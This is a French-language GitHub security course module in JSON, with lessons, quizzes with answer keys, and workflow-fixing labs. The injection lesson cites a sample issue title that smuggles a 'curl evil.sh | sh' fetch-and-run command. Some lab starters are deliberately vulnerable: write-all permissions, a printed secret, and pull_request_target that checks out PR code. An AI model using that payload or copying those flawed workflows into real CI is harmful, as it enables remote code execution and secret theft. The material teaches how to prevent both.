@@ -1,0 +1,1111 @@
+{
+ "id": "github",
+ "version": 1,
+ "title": "GitHub, le port de commerce",
+ "summary": "Sécuriser son compte, organiser dépôts, PR, tickets et releases, et écrire des workflows GitHub Actions sûrs.",
+ "objectives": [
+  "Protéger son compte et ses jetons",
+  "Collaborer par pull requests relues sur une branche protégée",
+  "Publier des releases vérifiables",
+  "Écrire des workflows à moindre privilège, épinglés et sans injection"
+ ],
+ "prerequisites": [
+  "Module Git"
+ ],
+ "lessons": [
+  {
+   "id": "compte-securise",
+   "title": "Un compte GitHub bien protégé",
+   "minutes": 15,
+   "objectives": [
+    "Activer la double authentification",
+    "Choisir entre SSH, jeton fin et gh pour s'authentifier"
+   ],
+   "sections": [
+    {
+     "type": "text",
+     "body": "Votre compte GitHub donne accès à votre code et souvent à celui de votre équipe : activez la double authentification (application TOTP ou clé de sécurité/passkey) et conservez les codes de secours hors ligne."
+    },
+    {
+     "type": "text",
+     "body": "Pour Git, trois options : une clé SSH (ssh -T git@github.com pour tester), un jeton « fine-grained » limité à certains dépôts, permissions et durée, ou gh auth login qui gère le jeton pour vous dans le trousseau du système."
+    },
+    {
+     "type": "code",
+     "body": "gh auth login\ngh auth status\nssh -T git@github.com",
+     "caption": "Se connecter avec la CLI, vérifier, tester une clé SSH"
+    },
+    {
+     "type": "warning",
+     "body": "Un jeton « classic » avec la portée repo ouvre TOUS vos dépôts : préférez un jeton fin, limité à un dépôt et 7 à 30 jours."
+    },
+    {
+     "type": "tip",
+     "body": "Un jeton ne se colle jamais dans un dépôt, un ticket ou une discussion IA : révoquez-le immédiatement s'il a fuité."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-1-1",
+     "type": "single",
+     "prompt": "Quel jeton GitHub limite l'accès à certains dépôts et permissions ?",
+     "choices": [
+      "Fine-grained",
+      "Classic avec repo",
+      "Le mot de passe",
+      "La clé GPG"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Le jeton fin choisit dépôts, permissions et date d'expiration."
+    },
+    {
+     "id": "gh-1-2",
+     "type": "single",
+     "prompt": "Que faire d'un jeton publié par erreur ?",
+     "choices": [
+      "Le révoquer immédiatement puis en créer un nouveau",
+      "Supprimer le commit suffit",
+      "Rendre le dépôt privé suffit",
+      "Rien s'il est ancien"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Des robots scrutent GitHub en continu : un secret publié est compromis, même effacé."
+    },
+    {
+     "id": "gh-1-3",
+     "type": "command",
+     "prompt": "Connectez la CLI GitHub à votre compte.",
+     "accepted": [
+      "gh auth login"
+     ],
+     "explanation": "gh stocke le jeton dans le trousseau du système."
+    },
+    {
+     "id": "gh-1-4",
+     "type": "command",
+     "prompt": "Testez votre clé SSH auprès de GitHub.",
+     "accepted": [
+      "ssh -T git@github.com"
+     ],
+     "explanation": "GitHub répond avec votre identifiant si la clé est reconnue."
+    }
+   ]
+  },
+  {
+   "id": "depots",
+   "title": "Créer et organiser un dépôt",
+   "minutes": 15,
+   "objectives": [
+    "Choisir la visibilité d'un dépôt",
+    "Poser README, licence et .gitignore dès le départ"
+   ],
+   "sections": [
+    {
+     "type": "code",
+     "body": "gh repo create mon-projet --private --source=. --remote=origin\ngit push -u origin main",
+     "caption": "Créer un dépôt privé depuis un projet local"
+    },
+    {
+     "type": "text",
+     "body": "Privé par défaut : on rend public après avoir vérifié l'historique (aucun secret, aucune donnée personnelle). Rendre un dépôt public expose TOUT l'historique, pas seulement la dernière version."
+    },
+    {
+     "type": "text",
+     "body": "Un bon dépôt contient un README (quoi, pourquoi, comment lancer), une LICENSE (sans licence, personne n'a le droit de réutiliser le code), un .gitignore et, pour un projet ouvert, un CONTRIBUTING et un SECURITY.md."
+    },
+    {
+     "type": "tip",
+     "body": "Les modèles de .gitignore de GitHub (gitignore.io aussi) évitent d'oublier build/, .env ou les fichiers d'IDE."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-2-1",
+     "type": "single",
+     "prompt": "Que publie le passage d'un dépôt en public ?",
+     "choices": [
+      "Tout l'historique",
+      "La dernière version seulement",
+      "Le README seulement",
+      "Les tickets seulement"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Vérifiez l'historique complet (secrets, données) avant de publier."
+    },
+    {
+     "id": "gh-2-2",
+     "type": "single",
+     "prompt": "Un dépôt public sans fichier LICENSE est…",
+     "choices": [
+      "Visible mais non réutilisable légalement",
+      "Libre de droits",
+      "Sous licence MIT",
+      "Interdit"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Par défaut, l'auteur garde tous les droits."
+    },
+    {
+     "id": "gh-2-3",
+     "type": "command",
+     "prompt": "Créez un dépôt privé « atelier » avec gh.",
+     "accepted": [
+      "gh repo create atelier --private"
+     ],
+     "explanation": "--private évite une publication accidentelle."
+    },
+    {
+     "id": "gh-2-4",
+     "type": "multiple",
+     "prompt": "Quels fichiers poser dès le départ ?",
+     "choices": [
+      "README",
+      "LICENSE",
+      ".gitignore",
+      ".env avec les mots de passe"
+     ],
+     "answer": [
+      0,
+      1,
+      2
+     ],
+     "explanation": "Le .env contient des secrets : il est ignoré, jamais versionné."
+    }
+   ]
+  },
+  {
+   "id": "protection",
+   "title": "Branches protégées et règles",
+   "minutes": 15,
+   "objectives": [
+    "Protéger la branche principale",
+    "Exiger revue et vérifications avant la fusion"
+   ],
+   "sections": [
+    {
+     "type": "text",
+     "body": "Une règle de protection (ou un « ruleset ») sur main interdit le push direct et le push forcé, exige une pull request approuvée et des vérifications CI réussies avant la fusion."
+    },
+    {
+     "type": "code",
+     "body": "Paramètres → Rules → Rulesets → New branch ruleset\n  ✓ Require a pull request before merging (1 approbation)\n  ✓ Require status checks to pass\n  ✓ Block force pushes",
+     "caption": "Réglages typiques d'un ruleset sur main"
+    },
+    {
+     "type": "text",
+     "body": "CODEOWNERS désigne des relecteurs obligatoires par dossier : un changement dans infra/ demande l'avis de l'équipe infra."
+    },
+    {
+     "type": "warning",
+     "body": "Les administrateurs peuvent contourner les règles s'ils ne sont pas inclus : n'ajoutez des exceptions que nommément."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-3-1",
+     "type": "single",
+     "prompt": "Que bloque une protection de branche typique ?",
+     "choices": [
+      "Le push direct et le push forcé sur main",
+      "La lecture du code",
+      "Les tickets",
+      "Les forks"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Toute modification passe par une PR relue."
+    },
+    {
+     "id": "gh-3-2",
+     "type": "single",
+     "prompt": "Rôle de CODEOWNERS ?",
+     "choices": [
+      "Désigner des relecteurs obligatoires par chemin",
+      "Lister les contributeurs",
+      "Chiffrer le code",
+      "Gérer la licence"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Il est lu automatiquement à l'ouverture d'une PR."
+    },
+    {
+     "id": "gh-3-3",
+     "type": "single",
+     "prompt": "Pourquoi exiger les vérifications CI avant fusion ?",
+     "choices": [
+      "Ne pas fusionner du code qui casse les tests",
+      "Pour aller plus vite",
+      "Pour publier une release",
+      "Pour fermer les tickets"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "La CI devient un garde-fou, pas une décoration."
+    },
+    {
+     "id": "gh-3-4",
+     "type": "single",
+     "prompt": "Le push forcé sur main…",
+     "choices": [
+      "Réécrit l'historique partagé et doit être bloqué",
+      "Est sans danger",
+      "Est obligatoire",
+      "Crée une release"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Il peut effacer le travail des autres."
+    }
+   ]
+  },
+  {
+   "id": "pull-requests",
+   "title": "Pull requests et revue de code",
+   "minutes": 20,
+   "objectives": [
+    "Ouvrir une PR claire et petite",
+    "Relire et choisir une stratégie de fusion"
+   ],
+   "sections": [
+    {
+     "type": "code",
+     "body": "git switch -c fix/titre-page\ngit commit -am \"fix: corrige le titre de la page\"\ngit push -u origin fix/titre-page\ngh pr create --fill --draft",
+     "caption": "Branche, commit, push, PR en brouillon"
+    },
+    {
+     "type": "text",
+     "body": "Une bonne PR est petite, explique le pourquoi, montre comment tester et lie le ticket (« Closes #12 » le fermera à la fusion)."
+    },
+    {
+     "type": "text",
+     "body": "Trois fusions possibles : merge commit (garde tout l'historique), squash (un seul commit propre), rebase (historique linéaire). L'équipe en choisit une et s'y tient."
+    },
+    {
+     "type": "tip",
+     "body": "En revue, commentez le code, pas la personne ; distinguez « bloquant » de « suggestion »."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-4-1",
+     "type": "single",
+     "prompt": "Que fait « Closes #12 » dans la description d'une PR ?",
+     "choices": [
+      "Ferme le ticket 12 à la fusion",
+      "Supprime la PR 12",
+      "Bloque la PR",
+      "Rien"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Fonctionne aussi avec Fixes ou Resolves."
+    },
+    {
+     "id": "gh-4-2",
+     "type": "single",
+     "prompt": "Fusion « squash » :",
+     "choices": [
+      "Regroupe les commits de la PR en un seul",
+      "Garde chaque commit et ajoute un commit de fusion",
+      "Supprime la branche distante seulement",
+      "Annule la PR"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Historique plus lisible, détail perdu."
+    },
+    {
+     "id": "gh-4-3",
+     "type": "command",
+     "prompt": "Ouvrez une PR en brouillon avec titre et description tirés des commits.",
+     "accepted": [
+      "gh pr create --fill --draft",
+      "gh pr create --draft --fill"
+     ],
+     "explanation": "Brouillon = pas encore prête à relire."
+    },
+    {
+     "id": "gh-4-4",
+     "type": "command",
+     "prompt": "Récupérez localement la PR numéro 42 pour la tester.",
+     "accepted": [
+      "gh pr checkout 42"
+     ],
+     "explanation": "Crée une branche locale avec le code de la PR."
+    }
+   ]
+  },
+  {
+   "id": "tickets",
+   "title": "Issues, labels et suivi",
+   "minutes": 12,
+   "objectives": [
+    "Écrire un ticket utile",
+    "Organiser le travail avec labels, jalons et Projects"
+   ],
+   "sections": [
+    {
+     "type": "text",
+     "body": "Un bon ticket dit : ce qui se passe, ce qui était attendu, comment reproduire, l'environnement. Les modèles (.github/ISSUE_TEMPLATE) guident les contributeurs."
+    },
+    {
+     "type": "code",
+     "body": "gh issue create --title \"Plantage à l'import\" --label bug\ngh issue list --label bug --state open",
+     "caption": "Créer et filtrer des tickets"
+    },
+    {
+     "type": "text",
+     "body": "Labels (bug, documentation), jalons (version 1.2) et tableaux Projects donnent une vue d'ensemble sans outil externe."
+    },
+    {
+     "type": "warning",
+     "body": "Une trace d'erreur collée dans un ticket public peut contenir un jeton, un chemin ou une adresse : relisez-la avant."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-5-1",
+     "type": "single",
+     "prompt": "Élément indispensable d'un rapport de bug ?",
+     "choices": [
+      "Les étapes pour reproduire",
+      "L'humeur du rapporteur",
+      "Le mot de passe",
+      "La liste des contributeurs"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Sans reproduction, le correctif est un pari."
+    },
+    {
+     "id": "gh-5-2",
+     "type": "single",
+     "prompt": "À quoi sert un jalon (milestone) ?",
+     "choices": [
+      "Regrouper les tickets visés pour une version",
+      "Supprimer des tickets",
+      "Chiffrer un ticket",
+      "Lancer la CI"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Il montre l'avancement vers la version."
+    },
+    {
+     "id": "gh-5-3",
+     "type": "command",
+     "prompt": "Listez les tickets ouverts portant le label bug.",
+     "accepted": [
+      "gh issue list --label bug",
+      "gh issue list --label bug --state open"
+     ],
+     "explanation": "Les filtres se combinent."
+    },
+    {
+     "id": "gh-5-4",
+     "type": "single",
+     "prompt": "Avant de coller un journal dans un ticket public…",
+     "choices": [
+      "Le relire et masquer jetons et données",
+      "Le compresser",
+      "Le traduire",
+      "Rien"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Le journal peut contenir des secrets."
+    }
+   ]
+  },
+  {
+   "id": "releases",
+   "title": "Tags, releases et versions",
+   "minutes": 15,
+   "objectives": [
+    "Numéroter selon SemVer",
+    "Publier une release avec notes et empreintes"
+   ],
+   "sections": [
+    {
+     "type": "text",
+     "body": "SemVer : MAJEUR.MINEUR.CORRECTIF. On incrémente MAJEUR quand on casse la compatibilité, MINEUR pour une nouveauté compatible, CORRECTIF pour une correction."
+    },
+    {
+     "type": "code",
+     "body": "git tag -a v1.3.0 -m \"v1.3.0\"\ngit push origin v1.3.0\ngh release create v1.3.0 dist/* --notes-file CHANGELOG.md --draft",
+     "caption": "Tag annoté, push du tag, release en brouillon avec ses artefacts"
+    },
+    {
+     "type": "text",
+     "body": "Joignez un fichier SHA256SUMS : l'utilisateur vérifie que l'artefact téléchargé est bien celui que vous avez publié."
+    },
+    {
+     "type": "warning",
+     "body": "Ne publiez jamais un APK signé avec la clé debug comme une release : nommez-le explicitement et réservez-le aux tests."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-6-1",
+     "type": "single",
+     "prompt": "Passer de 1.4.2 à 2.0.0 signifie…",
+     "choices": [
+      "Changement incompatible",
+      "Correction de bug",
+      "Nouvelle fonction compatible",
+      "Rien de particulier"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Le MAJEUR signale une rupture."
+    },
+    {
+     "id": "gh-6-2",
+     "type": "single",
+     "prompt": "Pourquoi publier SHA256SUMS ?",
+     "choices": [
+      "Permettre de vérifier l'intégrité des artefacts",
+      "Accélérer le téléchargement",
+      "Signer le code",
+      "Remplacer la licence"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "sha256sum -c SHA256SUMS fait la vérification."
+    },
+    {
+     "id": "gh-6-3",
+     "type": "command",
+     "prompt": "Créez un tag annoté v1.3.0.",
+     "accepted": [
+      "git tag -a v1.3.0 -m \"v1.3.0\"",
+      "git tag -a v1.3.0 -m v1.3.0"
+     ],
+     "explanation": "Un tag annoté porte auteur, date et message."
+    },
+    {
+     "id": "gh-6-4",
+     "type": "command",
+     "prompt": "Poussez le tag v1.3.0.",
+     "accepted": [
+      "git push origin v1.3.0"
+     ],
+     "explanation": "Les tags ne partent pas avec un simple git push."
+    }
+   ],
+   "lab": {
+    "kind": "workflow",
+    "intro": "Ce workflow de release donne tous les droits au jeton. Accordez l'écriture au seul job qui publie.",
+    "starter": "name: Release\non:\n  push:\n    tags: ['v*']\npermissions: write-all\njobs:\n  publier:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - run: gh release create \"$GITHUB_REF_NAME\" dist/* --draft\n        env:\n          GH_TOKEN: ${{ github.token }}\n",
+    "goals": [
+     {
+      "type": "noRule",
+      "label": "Plus de write-all",
+      "rule": "GH003"
+     },
+     {
+      "type": "contains",
+      "label": "Écriture limitée au contenu",
+      "text": "contents: write"
+     },
+     {
+      "type": "valid",
+      "label": "Fichier valide"
+     }
+    ],
+    "hint": "En tête : permissions: contents: read ; dans le job publier : permissions: contents: write.",
+    "solution": "name: Release\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: read\njobs:\n  publier:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    permissions:\n      contents: write\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - run: gh release create \"$GITHUB_REF_NAME\" dist/* --draft\n        env:\n          GH_TOKEN: ${{ github.token }}\n"
+   }
+  },
+  {
+   "id": "actions-bases",
+   "title": "GitHub Actions : premiers workflows",
+   "minutes": 20,
+   "objectives": [
+    "Lire la structure d'un workflow",
+    "Limiter les permissions et la durée des jobs"
+   ],
+   "sections": [
+    {
+     "type": "code",
+     "body": "name: CI\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@<sha>\n      - run: npm ci && npm test",
+     "caption": "Déclencheur, permissions, job, étapes"
+    },
+    {
+     "type": "text",
+     "body": "Chaque workflow reçoit un jeton GITHUB_TOKEN. Par défaut, ses droits dépendent des réglages du dépôt — parfois en écriture. Déclarez « permissions: contents: read » en tête, puis élargissez seulement le job qui en a besoin."
+    },
+    {
+     "type": "text",
+     "body": "Sans timeout-minutes, un job bloqué peut tourner 6 heures et consommer vos minutes."
+    },
+    {
+     "type": "tip",
+     "body": "act (outil tiers) ou un dépôt d'essai privé permettent de tester un workflow sans polluer le projet."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-7-1",
+     "type": "single",
+     "prompt": "Pourquoi déclarer permissions: contents: read ?",
+     "choices": [
+      "Limiter ce que le jeton du workflow peut modifier",
+      "Accélérer le job",
+      "Rendre le dépôt privé",
+      "Obligatoire pour checkout"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Moindre privilège pour le jeton."
+    },
+    {
+     "id": "gh-7-2",
+     "type": "single",
+     "prompt": "Durée maximale d'un job sans timeout-minutes ?",
+     "choices": [
+      "6 heures",
+      "10 minutes",
+      "Illimitée",
+      "1 heure"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Fixez une limite adaptée."
+    },
+    {
+     "id": "gh-7-3",
+     "type": "single",
+     "prompt": "Où se trouvent les workflows ?",
+     "choices": [
+      ".github/workflows/",
+      ".gitlab-ci.yml",
+      "ci/",
+      "Paramètres du dépôt seulement"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Un fichier YAML par workflow."
+    },
+    {
+     "id": "gh-7-4",
+     "type": "command",
+     "prompt": "Listez les dernières exécutions de workflows avec gh.",
+     "accepted": [
+      "gh run list"
+     ],
+     "explanation": "gh run view et gh run watch suivent une exécution."
+    }
+   ],
+   "lab": {
+    "kind": "workflow",
+    "intro": "Ce workflow laisse au jeton les droits par défaut et n'a aucune limite de durée. Corrigez-le.",
+    "starter": "name: CI\non:\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - run: npm ci && npm test\n",
+    "goals": [
+     {
+      "type": "noRule",
+      "label": "Permissions déclarées",
+      "rule": "GH002"
+     },
+     {
+      "type": "noRule",
+      "label": "Durée limitée",
+      "rule": "GH006"
+     },
+     {
+      "type": "valid",
+      "label": "Fichier valide"
+     }
+    ],
+    "hint": "Ajoutez « permissions: contents: read » au niveau du workflow et « timeout-minutes: 10 » au job.",
+    "solution": "name: CI\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - run: npm ci && npm test\n"
+   }
+  },
+  {
+   "id": "actions-epinglees",
+   "title": "Actions tierces : épingler et réduire",
+   "minutes": 18,
+   "objectives": [
+    "Comprendre le risque d'une étiquette mobile",
+    "Épingler une action par empreinte de commit"
+   ],
+   "sections": [
+    {
+     "type": "text",
+     "body": "uses: une-org/une-action@v3 suit une étiquette que l'auteur (ou un attaquant qui a volé son compte) peut déplacer vers un autre code. Votre workflow exécuterait alors ce nouveau code avec vos secrets."
+    },
+    {
+     "type": "code",
+     "body": "- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0",
+     "caption": "Épinglage par empreinte, version en commentaire"
+    },
+    {
+     "type": "text",
+     "body": "L'empreinte (40 caractères) désigne un contenu immuable. Dependabot sait mettre à jour ces empreintes et le commentaire."
+    },
+    {
+     "type": "tip",
+     "body": "Moins d'actions tierces = moins de risques : une ligne run: de trois commandes vaut souvent mieux qu'une action obscure."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-8-1",
+     "type": "single",
+     "prompt": "Pourquoi @v3 est-il risqué ?",
+     "choices": [
+      "L'étiquette peut être déplacée vers un autre code",
+      "v3 est obsolète",
+      "Les étiquettes sont interdites",
+      "C'est plus lent"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Seule l'empreinte de commit est immuable."
+    },
+    {
+     "id": "gh-8-2",
+     "type": "single",
+     "prompt": "Quelle référence est immuable ?",
+     "choices": [
+      "@11bd71901bbe5b1630ceea73d27597364c9af683",
+      "@v4",
+      "@main",
+      "@latest"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Une empreinte de 40 caractères."
+    },
+    {
+     "id": "gh-8-3",
+     "type": "single",
+     "prompt": "Qui peut tenir les empreintes à jour ?",
+     "choices": [
+      "Dependabot",
+      "Personne",
+      "GitHub Pages",
+      "Le README"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Il propose des PR avec la nouvelle empreinte."
+    },
+    {
+     "id": "gh-8-4",
+     "type": "single",
+     "prompt": "Une alternative à une action tierce simple ?",
+     "choices": [
+      "Quelques lignes run: lisibles",
+      "Ignorer la CI",
+      "Désactiver les permissions",
+      "Copier un jeton"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Moins de dépendances, moins de surface d'attaque."
+    }
+   ],
+   "lab": {
+    "kind": "workflow",
+    "intro": "Ces actions suivent des étiquettes mobiles. Épinglez-les par empreinte de commit.",
+    "starter": "name: CI\non:\n  push:\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n      - uses: actions/setup-node@v4\n      - run: npm ci\n",
+    "goals": [
+     {
+      "type": "noRule",
+      "label": "Toutes les actions épinglées par empreinte",
+      "rule": "GH001"
+     },
+     {
+      "type": "valid",
+      "label": "Fichier valide"
+     }
+    ],
+    "hint": "checkout : 11bd71901bbe5b1630ceea73d27597364c9af683 (v4.2.2) ; setup-node : 39370e3970a6d050c480ffad4ff0ed4d3fdee5af (v4.1.0).",
+    "solution": "name: CI\non:\n  push:\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0\n      - run: npm ci\n"
+   }
+  },
+  {
+   "id": "secrets-injection",
+   "title": "Secrets et injections dans les workflows",
+   "minutes": 22,
+   "objectives": [
+    "Utiliser les secrets sans les exposer",
+    "Éviter l'injection de commandes par des données tierces"
+   ],
+   "sections": [
+    {
+     "type": "text",
+     "body": "Les secrets (Paramètres → Secrets and variables → Actions) sont masqués dans les journaux, mais un echo, un encodage ou une erreur peuvent les révéler. Ne les affichez jamais et passez-les par env: au seul outil qui en a besoin."
+    },
+    {
+     "type": "code",
+     "body": "- run: echo \"Titre : ${{ github.event.issue.title }}\"   # DANGEREUX\n- env:\n    TITRE: ${{ github.event.issue.title }}\n  run: echo \"Titre : $TITRE\"           # sûr",
+     "caption": "Le titre d'un ticket est écrit par n'importe qui"
+    },
+    {
+     "type": "text",
+     "body": "${{ … }} est remplacé AVANT que le shell ne lise la commande : un titre comme « a\"; curl evil.sh | sh; \" » devient du code. Passé par une variable d'environnement, il reste une simple donnée."
+    },
+    {
+     "type": "text",
+     "body": "Les « environments » (production) ajoutent relecteurs obligatoires et secrets réservés au déploiement."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-9-1",
+     "type": "single",
+     "prompt": "Pourquoi ${{ github.event.issue.title }} dans run: est-il dangereux ?",
+     "choices": [
+      "Le texte est inséré dans la commande avant son exécution",
+      "Il est trop long",
+      "Il est chiffré",
+      "Il est vide"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Injection de commandes."
+    },
+    {
+     "id": "gh-9-2",
+     "type": "single",
+     "prompt": "Comment utiliser une donnée tierce dans run: ?",
+     "choices": [
+      "La passer par env: puis \"$VARIABLE\"",
+      "La mettre entre accents graves",
+      "L'afficher avec echo",
+      "La mettre dans le nom du job"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Elle reste une donnée."
+    },
+    {
+     "id": "gh-9-3",
+     "type": "single",
+     "prompt": "Un secret masqué dans les journaux peut-il fuiter ?",
+     "choices": [
+      "Oui, s'il est affiché transformé ou envoyé ailleurs",
+      "Non, jamais",
+      "Seulement sur GitLab",
+      "Seulement en privé"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Le masquage est un filet, pas une garantie."
+    },
+    {
+     "id": "gh-9-4",
+     "type": "single",
+     "prompt": "À quoi sert un environment « production » ?",
+     "choices": [
+      "Exiger une approbation et isoler les secrets de déploiement",
+      "Accélérer les jobs",
+      "Créer un fork",
+      "Supprimer les PR"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Le job attend la validation d'un relecteur."
+    }
+   ],
+   "lab": {
+    "kind": "workflow",
+    "intro": "Ce workflow de tri des tickets est vulnérable à l'injection et affiche un secret. Corrigez-le.",
+    "starter": "name: Tri\non:\n  issues:\n    types: [opened]\npermissions:\n  issues: write\njobs:\n  tri:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: |\n          echo \"Nouveau ticket : ${{ github.event.issue.title }}\"\n          echo \"Jeton : ${{ secrets.BOT_TOKEN }}\"\n",
+    "goals": [
+     {
+      "type": "noRule",
+      "label": "Plus d'injection",
+      "rule": "GH005"
+     },
+     {
+      "type": "noRule",
+      "label": "Aucun secret affiché",
+      "rule": "GH008"
+     },
+     {
+      "type": "noSeverity",
+      "label": "Aucun problème bloquant",
+      "severity": "blocking"
+     }
+    ],
+    "hint": "Passez le titre par env: (TITRE) et supprimez l'affichage du jeton.",
+    "solution": "name: Tri\non:\n  issues:\n    types: [opened]\npermissions:\n  issues: write\njobs:\n  tri:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - env:\n          TITRE: ${{ github.event.issue.title }}\n        run: |\n          echo \"Nouveau ticket : $TITRE\"\n"
+   }
+  },
+  {
+   "id": "contributions-externes",
+   "title": "Contributions externes et forks",
+   "minutes": 18,
+   "objectives": [
+    "Comprendre pull_request et pull_request_target",
+    "Construire le code d'un contributeur sans lui donner vos secrets"
+   ],
+   "sections": [
+    {
+     "type": "text",
+     "body": "Sur une PR venant d'un fork, l'événement pull_request s'exécute sans secrets et avec un jeton en lecture seule : c'est voulu, car le code de la PR n'est pas encore relu."
+    },
+    {
+     "type": "warning",
+     "body": "pull_request_target s'exécute dans le contexte de VOTRE dépôt, avec secrets et jeton en écriture. Y faire un checkout du code de la PR revient à exécuter le code d'un inconnu avec vos clés."
+    },
+    {
+     "type": "text",
+     "body": "Bonne pratique : construire et tester avec pull_request ; réserver pull_request_target aux actions qui ne lisent pas le code de la PR (étiqueter, commenter)."
+    },
+    {
+     "type": "tip",
+     "body": "Réglage utile : exiger l'approbation des workflows pour les nouveaux contributeurs (Settings → Actions)."
+    }
+   ],
+   "quiz": [
+    {
+     "id": "gh-10-1",
+     "type": "single",
+     "prompt": "Une PR de fork déclenchée par pull_request reçoit-elle les secrets ?",
+     "choices": [
+      "Non",
+      "Oui, tous",
+      "Seulement GITHUB_TOKEN en écriture",
+      "Oui si le dépôt est public"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Protection par défaut."
+    },
+    {
+     "id": "gh-10-2",
+     "type": "single",
+     "prompt": "Danger de pull_request_target + checkout du code de la PR ?",
+     "choices": [
+      "Exécuter du code inconnu avec vos secrets",
+      "Le job est plus lent",
+      "Aucun",
+      "La PR est fermée"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Une vulnérabilité classique (« pwn request »)."
+    },
+    {
+     "id": "gh-10-3",
+     "type": "single",
+     "prompt": "Pour tester le code d'un contributeur externe, utilisez…",
+     "choices": [
+      "pull_request",
+      "pull_request_target",
+      "workflow_dispatch avec secrets",
+      "schedule"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Sans secrets, sans écriture."
+    },
+    {
+     "id": "gh-10-4",
+     "type": "single",
+     "prompt": "Usage raisonnable de pull_request_target ?",
+     "choices": [
+      "Étiqueter la PR sans exécuter son code",
+      "Construire la PR",
+      "Déployer la PR",
+      "Publier une release"
+     ],
+     "answer": [
+      0
+     ],
+     "explanation": "Ne lit pas le code non relu."
+    }
+   ],
+   "lab": {
+    "kind": "workflow",
+    "intro": "Ce workflow construit le code des PR externes avec les secrets du dépôt. Rendez-le sûr.",
+    "starter": "name: Tests PR\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          persist-credentials: false\n      - run: npm ci && npm test\n",
+    "goals": [
+     {
+      "type": "noRule",
+      "label": "Le code externe ne s'exécute plus avec les secrets",
+      "rule": "GH004"
+     },
+     {
+      "type": "noSeverity",
+      "label": "Aucun problème bloquant",
+      "severity": "blocking"
+     }
+    ],
+    "hint": "Remplacez le déclencheur par pull_request et retirez le ref : checkout prendra le code de la PR sans secrets.",
+    "solution": "name: Tests PR\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - run: npm ci && npm test\n"
+   }
+  }
+ ],
+ "project": {
+  "title": "Workflow de CI prêt pour un projet ouvert",
+  "brief": "Un projet open source va accepter des contributions. Rédigez un workflow de CI sûr : moindre privilège, actions épinglées, pas d'injection ni de fuite de secret.",
+  "lab": {
+   "kind": "workflow",
